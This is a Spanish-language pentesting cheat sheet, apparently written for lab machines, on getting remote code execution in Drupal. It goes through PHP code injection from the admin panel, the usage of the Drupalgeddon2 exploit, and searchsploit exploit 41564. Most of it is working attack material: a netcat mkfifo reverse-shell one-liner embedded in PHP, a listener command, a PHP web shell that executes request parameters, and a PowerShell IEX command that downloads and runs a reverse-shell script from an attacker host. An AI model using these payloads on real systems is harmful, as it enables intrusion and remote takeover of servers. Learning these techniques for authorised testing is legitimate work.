** Explotación del panel de administración del gestor **
Cuando se consiguen credenciales válidas sobre el gestor, o mediante una inyección sql y se interna en el panel de administración del gestor:
>Se activa el módulo y se activa la característica "php filter" para permitir leer archivos php en el servidor web
>Se crea un nuevo artículo, donse se escribirá en lenguaje php el comando a ejecutar.
>Si queremos entablar una reverse shell con netcat, podemos acceder a los recursos de pentestmonkey
>`<?php system("'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'"); ?>`
>Se cambia el formato a php code y se guarda
>Abrimos un puerto en escucha en la máquina local
>`nc -nlvp 1234`
>Obtenemos una reverse shell, la cual habrá que tratar para tener mayorer capacidades.

** Drupalgeddon2 **
https://github.com/dreadlocked/Drupalgeddon2

Usage:
`ruby drupalggedon2.rb <target> [--verbose] [--authentication]`
 `ruby drupalgeddon2.rb https://example.com`

The `--verbose` and `--authentication` parameter can be added in any order after and they are both optional. If `--authentication` is specified then you will be prompted with a request to submit

-   username,
-   password,
-   form field name for username,
-   form field name for password,
-   URL path to the web login page, e.g., `user/login`
-   eventual suffix to append after the credentials in the form submission, e.g., form_id, etc.

This is to support exploiting websites that first require POST-based web login and who respond with a session cookie, upon successful authentication.

** Exploit 41564.php (searchsploit) **
Exploit capaz de depositar un fichero al que podemos acceder desde el navegador web. Lo lógico es depositar una webshell desde la que poder ejecutar comandos (RCE).
> `searchsploit -m 41564.php`
> `mv 41564.php exploit_drupal_rce.php`
> Editar script:
> Url del target, endpoint-path
> "data"="<?php echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>' ?>"
> Acceso desde el navegador al fichero --> http://10.10.10.9/s4vishell.php?cmd=whoami	(RCE)
> Ejemplo para obtener una reverse shell con Invoke-Powershell de Nishang:
>  `http://10.10.10.9/s4vishell.php?cmd=powershell "IEX(New-Object Net.Webclient).downloadString(%27http://10.10.16.109/Invoke-PosershellTCP.ps1%27)"`

